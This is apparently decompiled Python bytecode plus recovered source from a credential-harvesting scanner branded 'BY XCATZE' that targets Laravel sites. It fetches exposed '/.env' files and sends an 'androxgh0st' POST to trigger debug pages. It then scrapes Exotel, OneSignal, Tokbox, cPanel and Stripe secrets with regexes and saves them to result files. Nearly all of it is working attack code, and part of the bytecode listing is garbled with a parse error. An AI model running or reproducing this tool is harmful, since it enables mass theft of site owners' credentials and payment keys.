             4734  CALL_FUNCTION_2       2  ''
             4736  LOAD_CONST               0
             4738  BINARY_SUBSCR    
             4740  STORE_FAST               'exotel_sid'
             4742  POP_BLOCK        
             4744  JUMP_FORWARD       4762  'to 4762'
           4746_0  COME_FROM_FINALLY  4726  '4726'

 L.1751      4746  POP_TOP          
             4748  POP_TOP          
             4750  POP_TOP          

 L.1752      4752  LOAD_STR                 ''
             4754  STORE_FAST               'exotel_sid'
             4756  POP_EXCEPT       
             4758  JUMP_FORWARD       4762  'to 4762'
             4760  END_FINALLY      
           4762_0  COME_FROM          4758  '4758'
           4762_1  COME_FROM          4744  '4744'

 L.1753      4762  LOAD_GLOBAL              print
             4764  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mEXOTEL\n'
             4766  LOAD_METHOD              format
             4768  LOAD_GLOBAL              str
             4770  LOAD_FAST                'url'
             4772  CALL_FUNCTION_1       1  ''
             4774  CALL_METHOD_1         1  ''
             4776  CALL_FUNCTION_1       1  ''
             4778  POP_TOP          

 L.1754      4780  LOAD_STR                 'URL: '
             4782  LOAD_GLOBAL              str
             4784  LOAD_FAST                'url'
             4786  CALL_FUNCTION_1       1  ''
             4788  BINARY_ADD       
             4790  LOAD_STR                 '\nEXOTEL_API_KEY: '
             4792  BINARY_ADD       
             4794  LOAD_GLOBAL              str
             4796  LOAD_FAST                'exotel_api'
             4798  CALL_FUNCTION_1       1  ''
             4800  BINARY_ADD       
             4802  LOAD_STR                 '\nEXOTEL_API_TOKEN: '
             4804  BINARY_ADD       
             4806  LOAD_GLOBAL              str
             4808  LOAD_FAST                'exotel_token'
             4810  CALL_FUNCTION_1       1  ''
             4812  BINARY_ADD       
             4814  LOAD_STR                 '\nEXOTEL_API_SID: '
             4816  BINARY_ADD       
             4818  LOAD_GLOBAL              str
             4820  LOAD_FAST                'exotel_sid'
             4822  CALL_FUNCTION_1       1  ''
             4824  BINARY_ADD       
             4826  STORE_FAST               'build'

 L.1755      4828  LOAD_GLOBAL              str
             4830  LOAD_FAST                'build'
             4832  CALL_FUNCTION_1       1  ''
             4834  LOAD_METHOD              replace
             4836  LOAD_STR                 '\r'
             4838  LOAD_STR                 ''
             4840  CALL_METHOD_2         2  ''
             4842  STORE_FAST               'remover'

 L.1756      4844  LOAD_GLOBAL              open
             4846  LOAD_STR                 'result/EXOTEL.txt'
             4848  LOAD_STR                 'a'
             4850  CALL_FUNCTION_2       2  ''
             4852  STORE_FAST               'save'

 L.1757      4854  LOAD_FAST                'save'
             4856  LOAD_METHOD              write
             4858  LOAD_FAST                'remover'
             4860  LOAD_STR                 '\n\n'
             4862  BINARY_ADD       
             4864  CALL_METHOD_1         1  ''
             4866  POP_TOP          

 L.1758      4868  LOAD_FAST                'save'
             4870  LOAD_METHOD              close
             4872  CALL_METHOD_0         0  ''
             4874  POP_TOP          
           4876_0  COME_FROM          4650  '4650'
           4876_1  COME_FROM          4638  '4638'

 L.1761      4876  LOAD_STR                 '<td>ONESIGNAL_APP_ID</td>'
             4878  LOAD_FAST                'text'
             4880  COMPARE_OP               in
         4882_4884  POP_JUMP_IF_FALSE  5120  'to 5120'
             4886  LOAD_GLOBAL              ONESIGNAL
             4888  CALL_FUNCTION_0       0  ''
             4890  LOAD_STR                 'on'
             4892  COMPARE_OP               ==
         4894_4896  POP_JUMP_IF_FALSE  5120  'to 5120'

 L.1762      4898  SETUP_FINALLY      4918  'to 4918'

 L.1763      4900  LOAD_GLOBAL              reg
             4902  LOAD_STR                 '<td>ONESIGNAL_APP_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4904  LOAD_FAST                'text'
             4906  CALL_FUNCTION_2       2  ''
             4908  LOAD_CONST               0
             4910  BINARY_SUBSCR    
             4912  STORE_FAST               'onesignal_id'
             4914  POP_BLOCK        
             4916  JUMP_FORWARD       4934  'to 4934'
           4918_0  COME_FROM_FINALLY  4898  '4898'

 L.1764      4918  POP_TOP          
             4920  POP_TOP          
             4922  POP_TOP          

 L.1765      4924  LOAD_STR                 ''
             4926  STORE_FAST               'onesignal_id'
             4928  POP_EXCEPT       
             4930  JUMP_FORWARD       4934  'to 4934'
             4932  END_FINALLY      
           4934_0  COME_FROM          4930  '4930'
           4934_1  COME_FROM          4916  '4916'

 L.1766      4934  SETUP_FINALLY      4954  'to 4954'

 L.1767      4936  LOAD_GLOBAL              reg
             4938  LOAD_STR                 '<td>ONESIGNAL_REST_API_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4940  LOAD_FAST                'text'
             4942  CALL_FUNCTION_2       2  ''
             4944  LOAD_CONST               0
             4946  BINARY_SUBSCR    
             4948  STORE_FAST               'onesignal_token'
             4950  POP_BLOCK        
             4952  JUMP_FORWARD       4970  'to 4970'
           4954_0  COME_FROM_FINALLY  4934  '4934'

 L.1768      4954  POP_TOP          
             4956  POP_TOP          
             4958  POP_TOP          

 L.1769      4960  LOAD_STR                 ''
             4962  STORE_FAST               'onesignal_token'
             4964  POP_EXCEPT       
             4966  JUMP_FORWARD       4970  'to 4970'
             4968  END_FINALLY      
           4970_0  COME_FROM          4966  '4966'
           4970_1  COME_FROM          4952  '4952'

 L.1770      4970  SETUP_FINALLY      4990  'to 4990'

 L.1771      4972  LOAD_GLOBAL              reg
             4974  LOAD_STR                 '<td>ONESIGNAL_USER_AUTH_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             4976  LOAD_FAST                'text'
             4978  CALL_FUNCTION_2       2  ''
             4980  LOAD_CONST               0
             4982  BINARY_SUBSCR    
             4984  STORE_FAST               'onesignal_auth'
             4986  POP_BLOCK        
             4988  JUMP_FORWARD       5006  'to 5006'
           4990_0  COME_FROM_FINALLY  4970  '4970'

 L.1772      4990  POP_TOP          
             4992  POP_TOP          
             4994  POP_TOP          

 L.1773      4996  LOAD_STR                 ''
             4998  STORE_FAST               'onesignal_auth'
             5000  POP_EXCEPT       
             5002  JUMP_FORWARD       5006  'to 5006'
             5004  END_FINALLY      
           5006_0  COME_FROM          5002  '5002'
           5006_1  COME_FROM          4988  '4988'

 L.1774      5006  LOAD_GLOBAL              print
             5008  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mONESIGNAL\n'
             5010  LOAD_METHOD              format
             5012  LOAD_GLOBAL              str
             5014  LOAD_FAST                'url'
             5016  CALL_FUNCTION_1       1  ''
             5018  CALL_METHOD_1         1  ''
             5020  CALL_FUNCTION_1       1  ''
             5022  POP_TOP          

 L.1775      5024  LOAD_STR                 'URL: '
             5026  LOAD_GLOBAL              str
             5028  LOAD_FAST                'url'
             5030  CALL_FUNCTION_1       1  ''
             5032  BINARY_ADD       
             5034  LOAD_STR                 '\nONESIGNAL_APP_ID: '
             5036  BINARY_ADD       
             5038  LOAD_GLOBAL              str
             5040  LOAD_FAST                'onesignal_id'
             5042  CALL_FUNCTION_1       1  ''
             5044  BINARY_ADD       
             5046  LOAD_STR                 '\nONESIGNAL_REST_API_KEY: '
             5048  BINARY_ADD       
             5050  LOAD_GLOBAL              str
             5052  LOAD_FAST                'onesignal_token'
             5054  CALL_FUNCTION_1       1  ''
             5056  BINARY_ADD       
             5058  LOAD_STR                 '\nONESIGNAL_USER_AUTH_KEY: '
             5060  BINARY_ADD       
             5062  LOAD_GLOBAL              str
             5064  LOAD_FAST                'onesignal_auth'
             5066  CALL_FUNCTION_1       1  ''
             5068  BINARY_ADD       
             5070  STORE_FAST               'build'

 L.1776      5072  LOAD_GLOBAL              str
             5074  LOAD_FAST                'build'
             5076  CALL_FUNCTION_1       1  ''
             5078  LOAD_METHOD              replace
             5080  LOAD_STR                 '\r'
             5082  LOAD_STR                 ''
             5084  CALL_METHOD_2         2  ''
             5086  STORE_FAST               'remover'

 L.1777      5088  LOAD_GLOBAL              open
             5090  LOAD_STR                 'result/ONESIGNAL.txt'
             5092  LOAD_STR                 'a'
             5094  CALL_FUNCTION_2       2  ''
             5096  STORE_FAST               'save'

 L.1778      5098  LOAD_FAST                'save'
             5100  LOAD_METHOD              write
             5102  LOAD_FAST                'remover'
             5104  LOAD_STR                 '\n\n'
             5106  BINARY_ADD       
             5108  CALL_METHOD_1         1  ''
             5110  POP_TOP          

 L.1779      5112  LOAD_FAST                'save'
             5114  LOAD_METHOD              close
             5116  CALL_METHOD_0         0  ''
             5118  POP_TOP          
           5120_0  COME_FROM          4894  '4894'
           5120_1  COME_FROM          4882  '4882'

 L.1781      5120  LOAD_STR                 '<td>TOKBOX_KEY_DEV</td>'
             5122  LOAD_FAST                'text'
             5124  COMPARE_OP               in
         5126_5128  POP_JUMP_IF_FALSE  5318  'to 5318'
             5130  LOAD_GLOBAL              TOKBOX
             5132  CALL_FUNCTION_0       0  ''
             5134  LOAD_STR                 'on'
             5136  COMPARE_OP               ==
         5138_5140  POP_JUMP_IF_FALSE  5318  'to 5318'

 L.1782      5142  SETUP_FINALLY      5162  'to 5162'

 L.1783      5144  LOAD_GLOBAL              reg
             5146  LOAD_STR                 '<td>TOKBOX_KEY_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5148  LOAD_FAST                'text'
             5150  CALL_FUNCTION_2       2  ''
             5152  LOAD_CONST               0
             5154  BINARY_SUBSCR    
             5156  STORE_FAST               'tokbox_key'
             5158  POP_BLOCK        
             5160  JUMP_FORWARD       5178  'to 5178'
           5162_0  COME_FROM_FINALLY  5142  '5142'

 L.1784      5162  POP_TOP          
             5164  POP_TOP          
             5166  POP_TOP          

 L.1785      5168  LOAD_STR                 ''
             5170  STORE_FAST               'tokbox_key'
             5172  POP_EXCEPT       
             5174  JUMP_FORWARD       5178  'to 5178'
             5176  END_FINALLY      
           5178_0  COME_FROM          5174  '5174'
           5178_1  COME_FROM          5160  '5160'

 L.1786      5178  SETUP_FINALLY      5198  'to 5198'

 L.1787      5180  LOAD_GLOBAL              reg
             5182  LOAD_STR                 '<td>TOKBOX_SECRET_DEV<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5184  LOAD_FAST                'text'
             5186  CALL_FUNCTION_2       2  ''
             5188  LOAD_CONST               0
             5190  BINARY_SUBSCR    
             5192  STORE_FAST               'tokbox_secret'
             5194  POP_BLOCK        
             5196  JUMP_FORWARD       5214  'to 5214'
           5198_0  COME_FROM_FINALLY  5178  '5178'

 L.1788      5198  POP_TOP          
             5200  POP_TOP          
             5202  POP_TOP          

 L.1789      5204  LOAD_STR                 ''
             5206  STORE_FAST               'tokbox_secret'
             5208  POP_EXCEPT       
             5210  JUMP_FORWARD       5214  'to 5214'
             5212  END_FINALLY      
           5214_0  COME_FROM          5210  '5210'
           5214_1  COME_FROM          5196  '5196'

 L.1790      5214  LOAD_GLOBAL              print
             5216  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mTOKBOX\n'
             5218  LOAD_METHOD              format
             5220  LOAD_GLOBAL              str
             5222  LOAD_FAST                'url'
             5224  CALL_FUNCTION_1       1  ''
             5226  CALL_METHOD_1         1  ''
             5228  CALL_FUNCTION_1       1  ''
             5230  POP_TOP          

 L.1791      5232  LOAD_STR                 'URL: '
             5234  LOAD_GLOBAL              str
             5236  LOAD_FAST                'url'
             5238  CALL_FUNCTION_1       1  ''
             5240  BINARY_ADD       
             5242  LOAD_STR                 '\nTOKBOX_KEY_DEV: '
             5244  BINARY_ADD       
             5246  LOAD_GLOBAL              str
             5248  LOAD_FAST                'tokbox_key'
             5250  CALL_FUNCTION_1       1  ''
             5252  BINARY_ADD       
             5254  LOAD_STR                 '\nTOKBOX_SECRET_DEV: '
             5256  BINARY_ADD       
             5258  LOAD_GLOBAL              str
             5260  LOAD_FAST                'tokbox_secret'
             5262  CALL_FUNCTION_1       1  ''
             5264  BINARY_ADD       
             5266  STORE_FAST               'build'

 L.1792      5268  LOAD_GLOBAL              str
             5270  LOAD_FAST                'build'
             5272  CALL_FUNCTION_1       1  ''
             5274  LOAD_METHOD              replace
             5276  LOAD_STR                 '\r'
             5278  LOAD_STR                 ''
             5280  CALL_METHOD_2         2  ''
             5282  STORE_FAST               'remover'

 L.1793      5284  LOAD_GLOBAL              open
             5286  LOAD_STR                 'result/TOKBOX.txt'
             5288  LOAD_STR                 'a'
             5290  CALL_FUNCTION_2       2  ''
             5292  STORE_FAST               'save'

 L.1794      5294  LOAD_FAST                'save'
             5296  LOAD_METHOD              write
             5298  LOAD_FAST                'remover'
             5300  LOAD_STR                 '\n\n'
             5302  BINARY_ADD       
             5304  CALL_METHOD_1         1  ''
             5306  POP_TOP          

 L.1795      5308  LOAD_FAST                'save'
             5310  LOAD_METHOD              close
             5312  CALL_METHOD_0         0  ''
             5314  POP_TOP          
             5316  JUMP_FORWARD       5502  'to 5502'
           5318_0  COME_FROM          5138  '5138'
           5318_1  COME_FROM          5126  '5126'

 L.1796      5318  LOAD_STR                 '<td>TOKBOX_KEY</td>'
             5320  LOAD_FAST                'text'
             5322  COMPARE_OP               in
         5324_5326  POP_JUMP_IF_FALSE  5502  'to 5502'

 L.1797      5328  SETUP_FINALLY      5348  'to 5348'

 L.1798      5330  LOAD_GLOBAL              reg
             5332  LOAD_STR                 '<td>TOKBOX_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5334  LOAD_FAST                'text'
             5336  CALL_FUNCTION_2       2  ''
             5338  LOAD_CONST               0
             5340  BINARY_SUBSCR    
             5342  STORE_FAST               'tokbox_key'
             5344  POP_BLOCK        
             5346  JUMP_FORWARD       5364  'to 5364'
           5348_0  COME_FROM_FINALLY  5328  '5328'

 L.1799      5348  POP_TOP          
             5350  POP_TOP          
             5352  POP_TOP          

 L.1800      5354  LOAD_STR                 ''
             5356  STORE_FAST               'tokbox_key'
             5358  POP_EXCEPT       
             5360  JUMP_FORWARD       5364  'to 5364'
             5362  END_FINALLY      
           5364_0  COME_FROM          5360  '5360'
           5364_1  COME_FROM          5346  '5346'

 L.1801      5364  SETUP_FINALLY      5384  'to 5384'

 L.1802      5366  LOAD_GLOBAL              reg
             5368  LOAD_STR                 '<td>TOKBOX_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5370  LOAD_FAST                'text'
             5372  CALL_FUNCTION_2       2  ''
             5374  LOAD_CONST               0
             5376  BINARY_SUBSCR    
             5378  STORE_FAST               'tokbox_secret'
             5380  POP_BLOCK        
             5382  JUMP_FORWARD       5400  'to 5400'
           5384_0  COME_FROM_FINALLY  5364  '5364'

 L.1803      5384  POP_TOP          
             5386  POP_TOP          
             5388  POP_TOP          

 L.1804      5390  LOAD_STR                 ''
             5392  STORE_FAST               'tokbox_secret'
             5394  POP_EXCEPT       
             5396  JUMP_FORWARD       5400  'to 5400'
             5398  END_FINALLY      
           5400_0  COME_FROM          5396  '5396'
           5400_1  COME_FROM          5382  '5382'

 L.1805      5400  LOAD_GLOBAL              print
             5402  LOAD_STR                 '\x1b[1;40m[BY XCATZE] {} |   \x1b[1;32;40mTOKBOX\n'
             5404  LOAD_METHOD              format
             5406  LOAD_GLOBAL              str
             5408  LOAD_FAST                'url'
             5410  CALL_FUNCTION_1       1  ''
             5412  CALL_METHOD_1         1  ''
             5414  CALL_FUNCTION_1       1  ''
             5416  POP_TOP          

 L.1806      5418  LOAD_STR                 'URL: '
             5420  LOAD_GLOBAL              str
             5422  LOAD_FAST                'url'
             5424  CALL_FUNCTION_1       1  ''
             5426  BINARY_ADD       
             5428  LOAD_STR                 '\nTOKBOX_KEY_DEV: '
             5430  BINARY_ADD       
             5432  LOAD_GLOBAL              str
             5434  LOAD_FAST                'tokbox_key'
             5436  CALL_FUNCTION_1       1  ''
             5438  BINARY_ADD       
             5440  LOAD_STR                 '\nTOKBOX_SECRET_DEV: '
             5442  BINARY_ADD       
             5444  LOAD_GLOBAL              str
             5446  LOAD_FAST                'tokbox_secret'
             5448  CALL_FUNCTION_1       1  ''
             5450  BINARY_ADD       
             5452  STORE_FAST               'build'

 L.1807      5454  LOAD_GLOBAL              str
             5456  LOAD_FAST                'build'
             5458  CALL_FUNCTION_1       1  ''
             5460  LOAD_METHOD              replace
             5462  LOAD_STR                 '\r'
             5464  LOAD_STR                 ''
             5466  CALL_METHOD_2         2  ''
             5468  STORE_FAST               'remover'

 L.1808      5470  LOAD_GLOBAL              open
             5472  LOAD_STR                 'result/TOKBOX.txt'
             5474  LOAD_STR                 'a'
             5476  CALL_FUNCTION_2       2  ''
             5478  STORE_FAST               'save'

 L.1809      5480  LOAD_FAST                'save'
             5482  LOAD_METHOD              write
             5484  LOAD_FAST                'remover'
             5486  LOAD_STR                 '\n\n'
             5488  BINARY_ADD       
             5490  CALL_METHOD_1         1  ''
             5492  POP_TOP          

 L.1810      5494  LOAD_FAST                'save'
             5496  LOAD_METHOD              close
             5498  CALL_METHOD_0         0  ''
             5500  POP_TOP          
           5502_0  COME_FROM          5324  '5324'
           5502_1  COME_FROM          5316  '5316'

 L.1812      5502  LOAD_STR                 '<td>CPANEL_HOST</td>'
             5504  LOAD_FAST                'text'
             5506  COMPARE_OP               in
         5508_5510  POP_JUMP_IF_FALSE  5780  'to 5780'

 L.1813      5512  LOAD_STR                 'debug'
             5514  STORE_FAST               'method'

 L.1814      5516  SETUP_FINALLY      5536  'to 5536'

 L.1815      5518  LOAD_GLOBAL              reg
             5520  LOAD_STR                 '<td>CPANEL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5522  LOAD_FAST                'text'
             5524  CALL_FUNCTION_2       2  ''
             5526  LOAD_CONST               0
             5528  BINARY_SUBSCR    
             5530  STORE_FAST               'cipanel_host'
             5532  POP_BLOCK        
             5534  JUMP_FORWARD       5552  'to 5552'
           5536_0  COME_FROM_FINALLY  5516  '5516'

 L.1816      5536  POP_TOP          
             5538  POP_TOP          
             5540  POP_TOP          

 L.1817      5542  LOAD_STR                 ''
             5544  STORE_FAST               'cipanel_host'
             5546  POP_EXCEPT       
             5548  JUMP_FORWARD       5552  'to 5552'
             5550  END_FINALLY      
           5552_0  COME_FROM          5548  '5548'
           5552_1  COME_FROM          5534  '5534'

 L.1818      5552  SETUP_FINALLY      5572  'to 5572'

 L.1819      5554  LOAD_GLOBAL              reg
             5556  LOAD_STR                 '<td>CPANEL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5558  LOAD_FAST                'text'
             5560  CALL_FUNCTION_2       2  ''
             5562  LOAD_CONST               0
             5564  BINARY_SUBSCR    
             5566  STORE_FAST               'cipanel_port'
             5568  POP_BLOCK        
             5570  JUMP_FORWARD       5588  'to 5588'
           5572_0  COME_FROM_FINALLY  5552  '5552'

 L.1820      5572  POP_TOP          
             5574  POP_TOP          
             5576  POP_TOP          

 L.1821      5578  LOAD_STR                 ''
             5580  STORE_FAST               'cipanel_port'
             5582  POP_EXCEPT       
             5584  JUMP_FORWARD       5588  'to 5588'
             5586  END_FINALLY      
           5588_0  COME_FROM          5584  '5584'
           5588_1  COME_FROM          5570  '5570'

 L.1822      5588  SETUP_FINALLY      5608  'to 5608'

 L.1823      5590  LOAD_GLOBAL              reg
             5592  LOAD_STR                 '<td>CPANEL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5594  LOAD_FAST                'text'
             5596  CALL_FUNCTION_2       2  ''
             5598  LOAD_CONST               0
             5600  BINARY_SUBSCR    
             5602  STORE_FAST               'cipanel_user'
             5604  POP_BLOCK        
             5606  JUMP_FORWARD       5624  'to 5624'
           5608_0  COME_FROM_FINALLY  5588  '5588'

 L.1824      5608  POP_TOP          
             5610  POP_TOP          
             5612  POP_TOP          

 L.1825      5614  LOAD_STR                 ''
             5616  STORE_FAST               'cipanel_user'
             5618  POP_EXCEPT       
             5620  JUMP_FORWARD       5624  'to 5624'
             5622  END_FINALLY      
           5624_0  COME_FROM          5620  '5620'
           5624_1  COME_FROM          5606  '5606'

 L.1826      5624  SETUP_FINALLY      5644  'to 5644'

 L.1827      5626  LOAD_GLOBAL              reg
             5628  LOAD_STR                 '<td>CPANEL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5630  LOAD_FAST                'text'
             5632  CALL_FUNCTION_2       2  ''
             5634  LOAD_CONST               0
             5636  BINARY_SUBSCR    
             5638  STORE_FAST               'cipanel_pw'
             5640  POP_BLOCK        
             5642  JUMP_FORWARD       5660  'to 5660'
           5644_0  COME_FROM_FINALLY  5624  '5624'

 L.1828      5644  POP_TOP          
             5646  POP_TOP          
             5648  POP_TOP          

 L.1829      5650  LOAD_STR                 ''
             5652  STORE_FAST               'cipanel_pw'
             5654  POP_EXCEPT       
             5656  JUMP_FORWARD       5660  'to 5660'
             5658  END_FINALLY      
           5660_0  COME_FROM          5656  '5656'
           5660_1  COME_FROM          5642  '5642'

 L.1830      5660  LOAD_STR                 'URL: '
             5662  LOAD_GLOBAL              str
             5664  LOAD_FAST                'url'
             5666  CALL_FUNCTION_1       1  ''
             5668  BINARY_ADD       
             5670  LOAD_STR                 '\nMETHOD: '
             5672  BINARY_ADD       
             5674  LOAD_GLOBAL              str
             5676  LOAD_FAST                'method'
             5678  CALL_FUNCTION_1       1  ''
             5680  BINARY_ADD       
             5682  LOAD_STR                 '\nCPANEL_HOST: '
             5684  BINARY_ADD       
             5686  LOAD_GLOBAL              str
             5688  LOAD_FAST                'cipanel_host'
             5690  CALL_FUNCTION_1       1  ''
             5692  BINARY_ADD       
             5694  LOAD_STR                 '\nCPANEL_PORT: '
             5696  BINARY_ADD       
             5698  LOAD_GLOBAL              str
             5700  LOAD_FAST                'cipanel_port'
             5702  CALL_FUNCTION_1       1  ''
             5704  BINARY_ADD       
             5706  LOAD_STR                 '\nCPANEL_USERNAME: '
             5708  BINARY_ADD       
             5710  LOAD_GLOBAL              str
             5712  LOAD_FAST                'cipanel_user'
             5714  CALL_FUNCTION_1       1  ''
             5716  BINARY_ADD       
             5718  LOAD_STR                 '\nCPANEL_PASSWORD: '
             5720  BINARY_ADD       
             5722  LOAD_GLOBAL              str
             5724  LOAD_FAST                'cipanel_pw'
             5726  CALL_FUNCTION_1       1  ''
             5728  BINARY_ADD       
             5730  STORE_FAST               'build'

 L.1831      5732  LOAD_GLOBAL              str
             5734  LOAD_FAST                'build'
             5736  CALL_FUNCTION_1       1  ''
             5738  LOAD_METHOD              replace
             5740  LOAD_STR                 '\r'
             5742  LOAD_STR                 ''
             5744  CALL_METHOD_2         2  ''
             5746  STORE_FAST               'remover'

 L.1832      5748  LOAD_GLOBAL              open
             5750  LOAD_STR                 'result/CPANEL.txt'
             5752  LOAD_STR                 'a'
             5754  CALL_FUNCTION_2       2  ''
             5756  STORE_FAST               'save'

 L.1833      5758  LOAD_FAST                'save'
             5760  LOAD_METHOD              write
             5762  LOAD_FAST                'remover'
             5764  LOAD_STR                 '\n\n'
             5766  BINARY_ADD       
             5768  CALL_METHOD_1         1  ''
             5770  POP_TOP          

 L.1834      5772  LOAD_FAST                'save'
             5774  LOAD_METHOD              close
             5776  CALL_METHOD_0         0  ''
             5778  POP_TOP          
           5780_0  COME_FROM          5508  '5508'

 L.1836      5780  LOAD_STR                 '<td>STRIPE_KEY</td>'
             5782  LOAD_FAST                'text'
             5784  COMPARE_OP               in
         5786_5788  POP_JUMP_IF_FALSE  5962  'to 5962'

 L.1837      5790  LOAD_STR                 'debug'
             5792  STORE_FAST               'method'

 L.1838      5794  SETUP_FINALLY      5814  'to 5814'

 L.1839      5796  LOAD_GLOBAL              reg
             5798  LOAD_STR                 '<td>STRIPE_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5800  LOAD_FAST                'text'
             5802  CALL_FUNCTION_2       2  ''
             5804  LOAD_CONST               0
             5806  BINARY_SUBSCR    
             5808  STORE_FAST               'stripe_1'
             5810  POP_BLOCK        
             5812  JUMP_FORWARD       5830  'to 5830'
           5814_0  COME_FROM_FINALLY  5794  '5794'

 L.1840      5814  POP_TOP          
             5816  POP_TOP          
             5818  POP_TOP          

 L.1841      5820  LOAD_STR                 ''
             5822  STORE_FAST               'stripe_1'
             5824  POP_EXCEPT       
             5826  JUMP_FORWARD       5830  'to 5830'
             5828  END_FINALLY      
           5830_0  COME_FROM          5826  '5826'
           5830_1  COME_FROM          5812  '5812'

 L.1842      5830  SETUP_FINALLY      5850  'to 5850'

 L.1843      5832  LOAD_GLOBAL              reg
             5834  LOAD_STR                 '<td>STRIPE_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>'
             5836  LOAD_FAST                'text'
             5838  CALL_FUNCTION_2       2  ''
             5840  LOAD_CONST               0
             5842  BINARY_SUBSCR    
             5844  STORE_FAST               'stripe_2'
             5846  POP_BLOCK        
             5848  JUMP_FORWARD       5866  'to 5866'
           5850_0  COME_FROM_FINALLY  5830  '5830'

 L.1844      5850  POP_TOP          
             5852  POP_TOP          
             5854  POP_TOP          

 L.1845      5856  LOAD_STR                 ''
             5858  STORE_FAST               'stripe_2'
             5860  POP_EXCEPT       
             5862  JUMP_FORWARD       5866  'to 5866'
             5864  END_FINALLY      
           5866_0  COME_FROM          5862  '5862'
           5866_1  COME_FROM          5848  '5848'

 L.1846      5866  LOAD_STR                 'URL: '
             5868  LOAD_GLOBAL              str
             5870  LOAD_FAST                'url'
             5872  CALL_FUNCTION_1       1  ''
             5874  BINARY_ADD       
             5876  LOAD_STR                 '\nMETHOD: '
             5878  BINARY_ADD       
             5880  LOAD_GLOBAL              str
             5882  LOAD_FAST                'method'
             5884  CALL_FUNCTION_1       1  ''
             5886  BINARY_ADD       
             5888  LOAD_STR                 '\nSTRIPE_KEY: '
             5890  BINARY_ADD       
             5892  LOAD_GLOBAL              str
             5894  LOAD_FAST                'stripe_1'
             5896  CALL_FUNCTION_1       1  ''
             5898  BINARY_ADD       
             5900  LOAD_STR                 '\nSTRIPE_SECRET: '
             5902  BINARY_ADD       
             5904  LOAD_GLOBAL              str
             5906  LOAD_FAST                'stripe_2'
             5908  CALL_FUNCTION_1       1  ''
             5910  BINARY_ADD       
             5912  STORE_FAST               'build'

 L.1847      5914  LOAD_GLOBAL              str
             5916  LOAD_FAST                'build'
             5918  CALL_FUNCTION_1       1  ''
             5920  LOAD_METHOD              replace
             5922  LOAD_STR                 '\r'
             5924  LOAD_STR                 ''
             5926  CALL_METHOD_2         2  ''
             5928  STORE_FAST               'remover'

 L.1848      5930  LOAD_GLOBAL              open
             5932  LOAD_STR                 'Result/STRIPE_KEY.txt'
             5934  LOAD_STR                 'a'
             5936  CALL_FUNCTION_2       2  ''
             5938  STORE_FAST               'save'

 L.1849      5940  LOAD_FAST                'save'
             5942  LOAD_METHOD              write
             5944  LOAD_FAST                'remover'
             5946  LOAD_STR                 '\n\n'
             5948  BINARY_ADD       
             5950  CALL_METHOD_1         1  ''
             5952  POP_TOP          

 L.1850      5954  LOAD_FAST                'save'
             5956  LOAD_METHOD              close
             5958  CALL_METHOD_0         0  ''
             5960  POP_TOP          
           5962_0  COME_FROM          5786  '5786'
             5962  POP_BLOCK        
             5964  JUMP_FORWARD       6002  'to 6002'
           5966_0  COME_FROM_FINALLY     0  '0'

 L.1852      5966  DUP_TOP          
             5968  LOAD_GLOBAL              Exception
             5970  COMPARE_OP               exception-match
         5972_5974  POP_JUMP_IF_FALSE  6000  'to 6000'
             5976  POP_TOP          
             5978  STORE_FAST               'e'
             5980  POP_TOP          
             5982  SETUP_FINALLY      5988  'to 5988'

 L.1853      5984  POP_BLOCK        
             5986  BEGIN_FINALLY    
           5988_0  COME_FROM_FINALLY  5982  '5982'
             5988  LOAD_CONST               None
             5990  STORE_FAST               'e'
             5992  DELETE_FAST              'e'
             5994  END_FINALLY      
             5996  POP_EXCEPT       
             5998  JUMP_FORWARD       6002  'to 6002'
           6000_0  COME_FROM          5972  '5972'
             6000  END_FINALLY      
           6002_0  COME_FROM          5998  '5998'
           6002_1  COME_FROM          5964  '5964'

Parse error at or near `JUMP_FORWARD' instruction at offset 1604


def di_chckngntd(url):
    try:
        text = '\x1b[32;1m#\x1b[0m' + url
        headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get((url + '/.env'), headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if 'APP_KEY=' in str(get_source):
            get_smtp(url + '/.env', str(get_source))
        else:
            get_source3 = requests.post(url, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
            if '<td>APP_KEY</td>' in get_source3:
                get_smtp2(url, get_source3)
            else:
                if 'https' not in url and 'APP_KEY=' not in str(get_source):
                    nurl = url.replace('http', 'https')
                    get_source2 = requests.get((nurl + '/.env'), headers=headers, timeout=5, verify=False, allow_redirects=False).text
                    if 'APP_KEY=' in str(get_source2):
                        get_smtp(nurl + '/.env', str(get_source2))
                    else:
                        get_source4 = requests.post(nurl, data={'0x[]': 'androxgh0st'}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
                        if '<td>APP_KEY</td>' in get_source4:
                            get_smtp2(nurl, get_source4)
                        else:
                            print('\x1b[1;40m[BY XCATZE] {} |  \x1b[1;31;40mNOT VULN WITH HTTPS'.format(str(url)))
                else:
                    print('\x1b[1;40m[BY XCATZE] {} |  \x1b[1;31;40mNOT VULN'.format(str(url)))
    except Exception as e:
        try:
            pass
        finally:
            e = None
            del e


def di_chckngntd4(url):
    for pet in pathline:
        try:
            text = '\x1b[32;1m#\x1b[0m' + url
            headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            get_source = requests.get((url + str(pet)), headers=headers, timeout=5, verify=False, allow_redirects=False).text
            newurl = url + str(pet)
